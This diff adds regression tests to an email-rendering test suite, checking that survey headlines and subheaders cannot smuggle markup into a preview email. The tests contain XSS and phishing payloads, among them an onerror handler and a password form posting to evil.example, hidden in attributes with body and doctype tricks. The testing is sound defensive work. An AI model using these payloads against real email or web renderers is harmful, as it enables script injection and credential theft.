@@ -450,3 +450,44 @@ describe("renderEmbedSurveyPreviewEmail", () => {
     expect(starRatingFragment).not.toContain("⭐");
   });
 });
+
+// The sanitized headline is safe on its own, but two later steps scan the rendered email as a string:
+// react-email's `render` drops the first `<!DOCTYPE…>` it finds, and `extractEmailBodyFragment` cuts
+// between the first `<body` and the next `</body>`. Markup left inside an attribute value turns live
+// after either one, so no part of these payloads may reach the email, not even inside an attribute.
+describe("preview email with a hostile headline or subheader", () => {
+  const phishing =
+    "<img src=x onerror=alert(1)><form action=https://evil.example><input name=password><button>Log in</button></form>";
+
+  const renderWith = (field: "headline" | "subheader", html: string) => {
+    const survey = createEmbedSurveyPreviewEmailSurvey(TSurveyElementTypeEnum.OpenText);
+    const element = survey.blocks[0].elements[0];
+    element.headline = { default: field === "headline" ? html : "Question" };
+    element.subheader = { default: field === "subheader" ? html : "Details" };
+
+    return getPreviewEmailTemplateHtml(
+      survey,
+      EMBED_SURVEY_PREVIEW_SURVEY_URL,
+      EMBED_SURVEY_PREVIEW_STYLING,
+      EMBED_SURVEY_PREVIEW_LOCALE,
+      mockPreviewT
+    );
+  };
+
+  test.each([
+    ["a class", `<p class="<body>${phishing}">a</p><p class="</body>">b</p>`],
+    ["a data attribute", `<p data-a="<body>${phishing}">a</p><p data-a="</body>">b</p>`],
+    ["an aria attribute", `<p aria-label="<body>${phishing}">a</p><p aria-label="</body>">b</p>`],
+    ["a doctype in a class", `<p class="X<!DOCTYPE">a</p><p class="${phishing}">b</p>`],
+  ])("keeps markup hidden in %s out of the email", async (_case, html) => {
+    for (const field of ["headline", "subheader"] as const) {
+      const document = await renderWith(field, html);
+
+      for (const output of [document, extractEmailBodyFragment(document)]) {
+        for (const fragment of ["<img", "onerror", "<form", "<input", "<button", "evil.example"]) {
+          expect(output).not.toContain(fragment);
+        }
+      }
+    }
+  });
+});
